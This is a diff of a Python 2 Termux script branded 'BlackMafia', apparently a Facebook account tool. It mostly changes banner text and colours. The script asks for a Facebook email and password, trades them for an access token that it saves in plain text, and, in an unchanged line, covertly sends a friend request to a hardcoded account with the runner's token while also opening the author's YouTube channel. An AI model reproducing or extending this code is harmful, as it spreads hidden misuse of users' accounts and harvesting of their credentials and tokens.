@@ -181,34 +181,6 @@ while (loop == 'true'):
         print "\033[1;94mWrong Username"
         os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
 
-def lisensi():
-	os.system('reset')
-	masuk()
-
-##### Pilih Login #####
-def masuk():
-	os.system('reset')
-	print logo
-	print "\033[1;91m║--\033[1;91m> \033[1;95m1.\033[1;96m Login"
-	print "\033[1;92m║--\033[1;91m> \033[1;95m2.\033[1;96m Login using token"
-	print "\033[1;93m║--\033[1;91m> \033[1;95m0.\033[1;96m Exit"
-	print "\033[1;95m║"
-	msuk = raw_input("\033[1;96m╚═\033[1;1mchosse Option\033[1;93m")
-	if msuk =="":
-		print"\033[1;91m[!] Wrong input"
-		keluar()
-	elif msuk =="1":
-		login()
-	elif msuk =="2":
-		tokenz()
-	elif msuk =="0":
-		keluar()
-	else:
-		print"\033[1;91m[!] Wrong input"
-		keluar()
-		
-##### LOGIN #####
-#================#
 def login():
 	os.system('clear')
 	try:
@@ -217,22 +189,19 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		jalan(' \033[1;91mWarning● \033[1;92mDo Not Use Your Personal Account' )
-		jalan(' \033[1;91mWarning● \033[1;92mUse a New Account To Login' )
-		jalan(' \033[1;91mWarning● \033[1;92mTermux All Version Working' )
-                jalan(' \033[1;91mWarning● \033[1;92mTermux Data Clear Everyday' ) 
-                jalan(' \033[1;91mWarning● \033[1;92m👆Tool Update Everyday 👆' )
-                jalan(' \033[1;91mWarning● \033[1;92mTool Complet ████████ 70%' )              
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"
-		print('\033[1;97m  ▬\x1b[1;91m.........LOGIN WITH FACEBOOK..........\x1b[1;97m▬' )
+		jalan(' \033[1;94mWarning: \033[1;97mDo Not Use Your Personal Account' )
+		jalan(' \033[1;94mWarning: \033[1;97mUse a New Account To Login' )
+		jalan(' \033[1;94mWarning: \033[1;97mTermux Old Version install 0.63✅' )                 
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print('	   \033[1;97m▬\x1b[1;94m.........LOGIN WITH FACEBOOK........\x1b[1;97m▬' )
 		print('	' )
-		id = raw_input('\033[1;97m[●] \x1b[1;96mFacebook/Email\x1b[1;97m: \x1b[1;93m')
-		pwd = raw_input('\033[1;97m[●] \x1b[1;96mPassword\x1b[1;97m      : \x1b[1;91m')
+		id = raw_input('\033[1;97m[+] \x1b[1;94mID/Email\x1b[1;97m: \x1b[1;94m')
+		pwd = raw_input('\033[1;97m[+] \x1b[1;94mPassword\x1b[1;97m: \x1b[1;94m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\033[1;91m[!] No connection"
+			print"\n\x1b[1;97mThere is no internet connection"
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -251,24 +220,23 @@ def login():
 				url = "https://api.facebook.com/restserver.php"
 				r=requests.get(url,params=data)
 				z=json.loads(r.text)
-				zedd = open("login.txt", 'w')
-				zedd.write(z['access_token'])
-				zedd.close()
-				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
+				unikers = open("login.txt", 'w')
+				unikers.write(z['access_token'])
+				unikers.close()
+				print '\n\x1b[1;94mLogin Successful.•◈•..'
+				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.facebook.com/rendi.andika.3133')
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\033[1;91m[!] No connection"
+				print"\n\x1b[1;97mThere is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
-			print("\n\033[1;92m[#] Harap Login Ulang !")
+			print("\n\x1b[1;97mYour Account is on Checkpoint")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\033[1;91m[!] Login Failed")
+			print("\n\x1b[1;94mPassword/Email is wrong")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
